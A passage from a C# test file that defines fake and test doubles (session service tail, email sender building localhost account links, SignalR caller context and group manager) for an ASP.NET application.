        public Task<bool> IsSessionActiveAsync(Guid sessionId, CancellationToken ct = default)
            => Task.FromResult(true);

        public Task UpdateSessionActivityAsync(Guid sessionId, CancellationToken ct = default)
            => Task.CompletedTask;

        public Task RevokeAllSessionsAsync(UserId userId, CancellationToken ct = default)
            => Task.CompletedTask;
    }

    private sealed class FakeEmailSender : IEmailSender
    {
        public Task SendEmailConfirmationAsync(string email, string confirmationLink, CancellationToken ct = default)
            => Task.CompletedTask;

        public Task SendEmailConfirmationAsync(string email, string? displayName, string confirmationLink, CancellationToken ct = default)
            => Task.CompletedTask;

        public Task SendPasswordResetAsync(string email, string resetLink, CancellationToken ct = default)
            => Task.CompletedTask;

        public Task SendPasswordResetAsync(string email, string? displayName, string resetLink, CancellationToken ct = default)
            => Task.CompletedTask;

        public Task SendAccountRecoveryAsync(string email, string recoveryLink, CancellationToken ct = default)
            => Task.CompletedTask;

        public Task SendAccountRecoveryAsync(string email, string? displayName, string recoveryLink, CancellationToken ct = default)
            => Task.CompletedTask;

        public string BuildConfirmationLink(Guid userId, string token) => $"https://localhost:7001/Account/ConfirmEmail?userId={userId}&token={token}";
        public string BuildPasswordResetLink(string email, string token) => $"https://localhost:7001/Account/ResetPassword?email={Uri.EscapeDataString(email)}&token={token}";
        public string BuildAccountRecoveryLink(Guid userId, string token) => $"https://localhost:7001/Account/ConfirmRecovery?userId={userId}&token={token}";
    }

    private sealed class TestHubCallerContext : HubCallerContext
    {
        private readonly string _connectionId;

        public TestHubCallerContext(string connectionId)
        {
            _connectionId = connectionId;
        }

        public override string ConnectionId => _connectionId;
        public override string? UserIdentifier => null;
        public override ClaimsPrincipal? User => null;
        public override IDictionary<object, object?> Items { get; } = new Dictionary<object, object?>();
        public override IFeatureCollection Features { get; } = new FeatureCollection();
        public override CancellationToken ConnectionAborted => CancellationToken.None;
        public override void Abort() { }
    }

    private sealed class TestGroupManager : IGroupManager
    {
        public List<(string ConnectionId, string GroupName)> AddedToGroup { get; } = new();
        public List<(string ConnectionId, string GroupName)> RemovedFromGroup { get; } = new();

        public Task AddToGroupAsync(string connectionId, string groupName, CancellationToken cancellationToken = default)
        {
            AddedToGroup.Add((connectionId, groupName));
            return Task.CompletedTask;
        }

        public Task RemoveFromGroupAsync(string connectionId, string groupName, CancellationToken cancellationToken = default)
        {
            RemovedFromGroup.Add((connectionId, groupName));
            return Task.CompletedTask;
        }
    }
}
